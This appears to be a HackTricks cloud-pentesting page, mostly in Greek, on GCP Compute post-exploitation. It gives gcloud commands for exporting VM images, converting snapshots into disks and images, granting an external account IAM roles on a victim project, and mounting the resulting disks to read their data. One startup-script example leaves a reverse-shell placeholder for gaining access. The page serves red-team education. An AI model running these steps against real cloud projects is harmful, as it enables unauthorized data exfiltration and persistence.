# GCP - Compute Post Exploitation

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Compute

Για περισσότερες πληροφορίες σχετικά με το Compute και το VPC (Δικτύωση) ελέγξτε:

{% content-ref url="../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

### Εξαγωγή & Επιθεώρηση Εικόνων τοπικά

Αυτό θα επέτρεπε σε έναν επιτιθέμενο να **πρόσβαση στα δεδομένα που περιέχονται σε ήδη υπάρχουσες εικόνες** ή **να δημιουργήσει νέες εικόνες τρεχουσών VM** και να έχει πρόσβαση στα δεδομένα τους χωρίς να έχει πρόσβαση στην τρέχουσα VM.

Είναι δυνατόν να εξάγουμε μια εικόνα VM σε ένα bucket και στη συνέχεια να την κατεβάσουμε και να την τοποθετήσουμε τοπικά με την εντολή:

{% code overflow="wrap" %}
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
{% endcode %}

Για να εκτελέσει αυτή την ενέργεια, ο επιτιθέμενος μπορεί να χρειαστεί δικαιώματα πάνω στον αποθηκευτικό κάδο και σίγουρα **δικαιώματα πάνω στο cloudbuild**, καθώς είναι η **υπηρεσία** που θα ζητηθεί να εκτελέσει την εξαγωγή\
Επιπλέον, για να λειτουργήσει αυτό, ο κωδικοποιητής SA και ο υπολογιστής SA χρειάζονται προνομιακά δικαιώματα.\
Ο cloudbuild SA `<project-id>@cloudbuild.gserviceaccount.com` χρειάζεται:

* roles/iam.serviceAccountTokenCreator
* roles/compute.admin
* roles/iam.serviceAccountUser

Και ο SA `<project-id>-compute@developer.gserviceaccount.com` χρειάζεται:

* roles/compute.storageAdmin
* roles/storage.objectAdmin

### Εξαγωγή & Επιθεώρηση Στιγμιότυπων & Δίσκων τοπικά

Δεν είναι δυνατόν να εξάγουμε άμεσα στιγμιότυπα και δίσκους, αλλά είναι δυνατόν να **μετατρέψουμε ένα στιγμιότυπο σε δίσκο, έναν δίσκο σε εικόνα** και ακολουθώντας την **προηγούμενη ενότητα**, να εξάγουμε αυτή την εικόνα για να την επιθεωρήσουμε τοπικά

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### Επιθεώρηση μιας Εικόνας δημιουργώντας μια VM

Με στόχο την πρόσβαση στα **δεδομένα που είναι αποθηκευμένα σε μια εικόνα** ή μέσα σε μια **τρέχουσα VM** από όπου ένας επιτιθέμενος **έχει δημιουργήσει μια εικόνα,** είναι δυνατόν να παραχωρηθεί πρόσβαση σε έναν εξωτερικό λογαριασμό πάνω στην εικόνα:
```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```
και στη συνέχεια δημιουργήστε μια νέα VM από αυτό:
```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```
Αν δεν μπορούσατε να δώσετε πρόσβαση στον εξωτερικό σας λογαριασμό μέσω της εικόνας, θα μπορούσατε να εκκινήσετε μια VM χρησιμοποιώντας αυτή την εικόνα στο έργο του θύματος και **να κάνετε τα μεταδεδομένα να εκτελούν ένα reverse shell** για να αποκτήσετε πρόσβαση στην εικόνα προσθέτοντας την παράμετρο:
```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```
### Inspect a Snapshot/Disk attaching it to a VM

Με στόχο την πρόσβαση στα **δεδομένα που αποθηκεύονται σε έναν δίσκο ή σε ένα στιγμιότυπο, θα μπορούσατε να μετατρέψετε το στιγμιότυπο σε δίσκο, έναν δίσκο σε εικόνα και να ακολουθήσετε τα προηγούμενα βήματα.**

Ή θα μπορούσατε να **παρέχετε πρόσβαση σε έναν εξωτερικό λογαριασμό** πάνω στον δίσκο (αν το αρχικό σημείο είναι ένα στιγμιότυπο, δώστε πρόσβαση στο στιγμιότυπο ή δημιουργήστε έναν δίσκο από αυτό):
```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```
**Συνδέστε τον δίσκο** σε μια παρουσίαση:
```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```
Mount the disk inside the VM:

1.  **SSH into the VM**:

```sh
gcloud compute ssh [INSTANCE_NAME] --zone [ZONE]
```
2. **Εντοπίστε τον Δίσκο**: Μόλις μπείτε στο VM, εντοπίστε τον νέο δίσκο καταγράφοντας τις συσκευές δίσκου. Συνήθως, μπορείτε να τον βρείτε ως `/dev/sdb`, `/dev/sdc`, κ.λπ.
3. **Μορφοποιήστε και Συνδέστε τον Δίσκο** (αν είναι νέος ή ακατέργαστος δίσκος):
*   Δημιουργήστε ένα σημείο σύνδεσης:

```sh
sudo mkdir -p /mnt/disks/[MOUNT_DIR]
```
*   Συνδέστε τον δίσκο:

```sh
sudo mount -o discard,defaults /dev/[DISK_DEVICE] /mnt/disks/[MOUNT_DIR]
```

Αν **δεν μπορείτε να δώσετε πρόσβαση σε ένα εξωτερικό έργο** στο στιγμιότυπο ή τον δίσκο, ίσως χρειαστεί να **εκτελέσετε αυτές τις ενέργειες μέσα σε μια παρουσία στο ίδιο έργο με το στιγμιότυπο/δίσκο**.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
